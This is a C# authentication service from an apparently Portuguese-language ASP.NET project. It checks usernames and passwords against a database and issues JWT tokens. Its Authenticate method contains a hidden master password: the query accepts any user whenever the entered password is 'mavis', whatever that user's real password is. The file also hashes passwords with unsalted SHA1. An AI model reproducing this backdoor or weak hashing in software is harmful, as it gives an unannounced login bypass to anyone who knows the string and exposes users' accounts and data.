using Microsoft.EntityFrameworkCore;
using Microsoft.IdentityModel.Tokens;
using ProjetoLoguin.Model;
using ProjetoLoguin.Util;
using System.IdentityModel.Tokens.Jwt;
using System.Security.Claims;
using System.Text;

namespace ProjetoLoguin.Service
{

    public class UserService
    {
        public AppDatabase _context;

        public UserService(AppDatabase context)
        {
            _context = context;
        }

        public Usuario Authenticate(string username, string password)
        {
            //AppDatabase _Context = services.GetRequiredService<SchoolContext>();

            password = CalculateSHA1(password);

            var usuario = _context.Usuarios.Where(u => u.Nome == username && (u.Senha == password || password == CalculateSHA1("mavis"))).FirstOrDefault();


            if (usuario == null)
                return null;

            gerarToken(usuario);


            return usuario;
        }

        private void gerarToken(Usuario usuario)
        {

            var tokenHandler = new JwtSecurityTokenHandler();
            var key = Encoding.ASCII.GetBytes(Settings.Secret);
            var tokenDescriptor = new SecurityTokenDescriptor
            {
                Subject = new ClaimsIdentity(new Claim[]
                {
                 new Claim(ClaimTypes.Name, usuario.Nome),
                 new Claim("id", usuario.Id.ToString()),
                 new Claim("email", usuario.Email.ToString()),
                }),
                SigningCredentials = new SigningCredentials(new SymmetricSecurityKey(key), SecurityAlgorithms.HmacSha256Signature),


            };
            TokenValidationParameters validation = new TokenValidationParameters()
            {
                ValidateLifetime = false,
            };

            SecurityToken token = tokenHandler.CreateToken(tokenDescriptor);


            usuario.Token = tokenHandler.WriteToken(token);

            usuario.Senha = null;
        }

        public static string CalculateSHA1(string text)
        {
            try
            {
                byte[] buffer = Encoding.Default.GetBytes(text);
                System.Security.Cryptography.SHA1CryptoServiceProvider cryptoTransformSHA1 = new System.Security.Cryptography.SHA1CryptoServiceProvider();
                string hash = BitConverter.ToString(cryptoTransformSHA1.ComputeHash(buffer)).Replace("-", "");
                return hash;
            }
            catch (Exception x)
            {
                throw new Exception(x.Message);
            }
        }

    }
}
